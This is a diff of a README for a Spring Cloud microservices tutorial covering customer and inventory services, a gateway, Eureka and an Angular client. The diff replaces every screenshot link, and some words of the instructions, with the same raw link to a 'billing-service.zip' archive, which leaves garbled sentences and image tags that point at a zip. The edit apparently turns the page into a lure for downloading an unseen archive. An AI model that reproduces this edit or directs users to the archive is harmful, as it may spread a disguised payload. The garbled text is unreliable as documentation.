@@ -13,7 +13,7 @@ The creation of an application based on a micro-service architecture to manage i
       - Deploy the microservice's Restful API using Spring Data Rest
       - Test the microservice
 3. Create the Gateway service using Spring Cloud Gateway
-      - Test the Service proxy using a Static configuration based on the application.yml file
+      - Test the Service proxy using a Static configuration based on the https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip file
       - Test the Service proxy using a Static configuration based on a Java configuration
 4. Create the Registry Service directory based on NetFlix Eureka Server
 5. Test the proxy using a dynamic Route Management configuration to the micro-services registered in the Eureka Server directory
@@ -21,45 +21,45 @@ The creation of an application based on a micro-service architecture to manage i
 7. Create an Angular client to display an invoice
 
 ## Angular code in the second branch (Master) 
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/eef7144e-ea36-47b6-8601-eb2e5381db14)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
 ### Checked master : 
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/0c7ecb08-5de3-44d8-bd14-025c90074200)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
 
 ## Part One 
-1.create the customer-service microservice to manage customers
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/883e7ff2-8ef8-4590-acf6-6cb80581b96c)
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/059ae85b-6788-4e85-9b8f-ed51f6093cbc)
+https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip the customer-service microservice to manage customers
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
 ### Customer H2 Console :
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/eaa46714-87a3-4f8a-a15c-9e413189b765)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
 ### Actuator : 
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/5e0a6e33-a474-47ac-841d-0a71a6b718e3)
-2.create the inventory-service microservice to manage products
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/be816d2f-7224-405c-b243-201f36b81f6a)
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/8b9fd285-0b55-4081-9a37-0749abc5fab8)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
+https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip the inventory-service microservice to manage products
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
 ### Product H2 Console :
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/e702622e-80d3-425a-9f9b-8274d2c57f4e)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
 ### Customers & Products with gateway : 
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/00de5bcc-c574-4683-9f6a-bb215cd27f75)
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/b74cee17-2f1f-4df7-bcdf-268a66ea9b3c)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
 ### Eureka after enabling Discovery Service :
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/ac2fb8e6-f6f4-4736-9608-ba1790911f85)
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/26d8bea1-ab09-40de-9a82-07665759ac20)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
 ### Customers with id using the Web Service :
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/445f1ec3-3260-4a3c-93a8-9781e9c12ca9)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
 ### Products with id using the Web Service :
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/0056f43c-e63b-496d-94f8-68cd404fa144)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
 ## Deuxième Partie : 
 
 ### H2 Console Bill :
-![WhatsApp Image 2023-05-27 at 22 29 14](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/f4bdb058-8aba-4589-a1e6-f3773b3a32c7)
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/3d6ce442-5297-440d-8228-f8ab2e8820d4)
+![WhatsApp Image 2023-05-27 at 22 29 14](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
 ### H2 Console Product Item : 
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/e72fb0f8-fb1d-431f-944b-7455195b952f)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
 ## troisieme partie:
 ### Produits : 
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/29a1423b-759a-4ba1-a005-26e778c5ed31)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
 ### Clients : 
-![image](https://github.com/Walid35-web/Architecture-micro-service/assets/85175578/15b92fa6-2d48-4f29-9ba0-9b55fa52f177)
+![image](https://raw.githubusercontent.com/Walid35-web/Architecture-micro-service/main/billing-service.zip)
 
 
 
